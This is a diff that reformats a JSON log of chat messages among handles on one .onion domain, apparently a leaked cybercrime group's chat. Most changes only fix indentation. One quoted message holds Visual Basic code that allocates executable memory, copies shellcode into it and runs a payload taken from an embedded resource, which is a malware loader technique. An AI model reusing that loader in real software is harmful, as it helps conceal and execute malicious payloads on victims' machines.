@@ -41,7 +41,7 @@
   "body": "so blig doesn't work either(( I create an echo works"
 }
 {
-   "ts": "2021-02-25T06:52:19.951729",
+  "ts": "2021-02-25T06:52:19.951729",
   "from": "many@q3mcco35auwcstmt.onion",
   "to": "hof@q3mcco35auwcstmt.onion",
   "body": "Function TestFunc() As Boolean{backslash}n {backslash}n hInstance = GetModuleHandle(ByVal 0&){backslash}n {backslash}n tLenght = mHCP(AddressOf tshellStart) - mHCP(AddressOf tShellEnd){backslash}n {backslash}n tDis = VirtualAlloc(ByVal 0&, tLenght, MEM_COMMIT, &H40){backslash}n {backslash}n CopyMemory ByVal tDis, ByVal mHCP(AddressOf tShellEnd), tLenght{backslash}n {backslash}n tSpliceFromRes AddressOf BexToPointer, tDis + mHCP(AddressOf fContent) - mHCP(AddressOf tShellEnd){backslash}n {backslash}n InitMyShellCode (tDis){backslash}n{backslash}n Dim hResource As Long:                Dim hMemory As Long{backslash}n Dim lResSize As Long:                Dim pRawData As Long{backslash}n{backslash}n{backslash}n hResource = FindResource(hInstance, GetString(PROJECT), RT_RCDATA){backslash}n {backslash}n hMememory = LoadResource(hInstance, hResource){backslash}n {backslash}n lResSize = SizeofResource(hInstance, hResource){backslash}n {backslash}n pRawData = LockResource(hMememory){backslash}n {backslash}n Dim ret As Variant{backslash}n ret = MessageBox(0, {backslash}"0{backslash}", {backslash}"0{backslash}", 0){backslash}n BexToPointer pRawData{backslash}n {backslash}n {backslash}n End Function"
@@ -107,7 +107,7 @@
   "body": "otpsihi"
 }
 {
-   "ts": "2021-02-25T11:04:49.212042",
+  "ts": "2021-02-25T11:04:49.212042",
   "from": "love@q3mcco35auwcstmt.onion",
   "to": "void@q3mcco35auwcstmt.onion",
   "body": "123"
@@ -161,13 +161,13 @@
   "body": ")"
 }
 {
-   "ts": "2021-02-25T12:55:43.564849",
+  "ts": "2021-02-25T12:55:43.564849",
   "from": "ramon@q3mcco35auwcstmt.onion",
   "to": "tatarin@q3mcco35auwcstmt.onion",
   "body": "otpsihi"
 }
 {
-   "ts": "2021-02-25T13:14:10.869025",
+  "ts": "2021-02-25T13:14:10.869025",
   "from": "kevin@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": "hello. well you don't communicate willingly, i don't pull any punches."
@@ -215,7 +215,7 @@
   "body": "and I was texting you by the way)"
 }
 {
-   "ts": "2021-02-25T13:33:10.923225",
+  "ts": "2021-02-25T13:33:10.923225",
   "from": "kevin@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": "[09.02.2021 20:12:05] <Kevin> hi.{backslash}n[09.02.2021 20:12:09] <Kevin> how is it? {backslash}n[09.02.2021 20:12:19] <Kevin> did paul cheer up a bit? {backslash}n[09.02.2021 20:46:03] <Stern> hi yes"
@@ -227,13 +227,13 @@
   "body": "doesn't really sound like you're talking about wanting to communicate."
 }
 {
-   "ts": "2021-02-25T13:33:22.125937",
+  "ts": "2021-02-25T13:33:22.125937",
   "from": "kevin@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": ")"
 }
 {
-   "ts": "2021-02-25T13:33:26.226075",
+  "ts": "2021-02-25T13:33:26.226075",
   "from": "kevin@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": "burn*"
@@ -398,7 +398,7 @@
   "ts": "2021-02-25T14:43:36.551229",
   "from": "grant@q3mcco35auwcstmt.onion",
   "to": "sunday@q3mcco35auwcstmt.onion",
-  "body": "from": "to?"
+  "body": "from to?"
 }
 {
   "ts": "2021-02-25T14:43:39.171100",
@@ -431,7 +431,7 @@
   "body": "oh well."
 }
 {
-   "ts": "2021-02-25T14:45:15.619909",
+  "ts": "2021-02-25T14:45:15.619909",
   "from": "grant@q3mcco35auwcstmt.onion",
   "to": "sunday@q3mcco35auwcstmt.onion",
   "body": "too"
@@ -539,13 +539,13 @@
   "body": "lag"
 }
 {
-   "ts": "2021-02-25T16:36:45.604672",
+  "ts": "2021-02-25T16:36:45.604672",
   "from": "love@q3mcco35auwcstmt.onion",
   "to": "kramer@q3mcco35auwcstmt.onion",
   "body": "re"
 }
 {
-   "ts": "2021-02-25T17:11:42.419024",
+  "ts": "2021-02-25T17:11:42.419024",
   "from": "love@q3mcco35auwcstmt.onion",
   "to": "kramer@q3mcco35auwcstmt.onion",
   "body": "and as for the subject line, can't you use headers like "important" or "must-read"? only on eng"
@@ -557,7 +557,7 @@
   "body": "https://privnote.com/2GmggqHb#WINDN0sHl"
 }
 {
-   "ts": "2021-02-25T17:25:21.497990",
+  "ts": "2021-02-25T17:25:21.497990",
   "from": "terry@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": "hello"
@@ -569,7 +569,7 @@
   "body": "all bots in the rob64 offe"
 }
 {
-   "ts": "2021-02-25T17:32:23.437159",
+  "ts": "2021-02-25T17:32:23.437159",
   "from": "sunday@q3mcco35auwcstmt.onion",
   "to": "grant@q3mcco35auwcstmt.onion",
   "body": "and there's probably a glitch"
@@ -635,13 +635,13 @@
   "body": "doesn't really sound like you're talking about wanting to communicate."
 }
 {
-   "ts": "2021-02-25T18:02:01.513575",
+  "ts": "2021-02-25T18:02:01.513575",
   "from": "kevin@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": ")"
 }
 {
-   "ts": "2021-02-25T18:02:01.514363",
+  "ts": "2021-02-25T18:02:01.514363",
   "from": "kevin@q3mcco35auwcstmt.onion",
   "to": "stern@q3mcco35auwcstmt.onion",
   "body": "burn*"
@@ -716,7 +716,7 @@
   "ts": "2021-02-25T19:41:43.917182",
   "from": "driver@q3mcco35auwcstmt.onion",
   "to": "defender@q3mcco35auwcstmt.onion",
-   "body": "Priority on packets also means I'm sitting up at night.{I just had data go from import to pink last night and I figured out how to debug supervisor with german, I put a lot of work into it very much."
+  "body": "Priority on packets also means I'm sitting up at night.{I just had data go from import to pink last night and I figured out how to debug supervisor with german, I put a lot of work into it very much."
 }
 {
   "ts": "2021-02-25T19:43:07.821415",
@@ -797,13 +797,13 @@
   "body": "[Error: message is encrypted and cannot be decrypted.]"
 }
 {
-   "ts": "2021-02-25T21:07:15.565873",
+  "ts": "2021-02-25T21:07:15.565873",
   "from": "taker@q3mcco35auwcstmt.onion",
   "to": "veron@q3mcco35auwcstmt.onion",
   "body": "[Error: message is encrypted and cannot be decrypted.]"
 }
 {
-   "ts": "2021-02-25T21:07:18.967990",
+  "ts": "2021-02-25T21:07:18.967990",
   "from": "veron@q3mcco35auwcstmt.onion",
   "to": "taker@q3mcco35auwcstmt.onion",
   "body": "[Error: message is encrypted and cannot be decrypted.]"
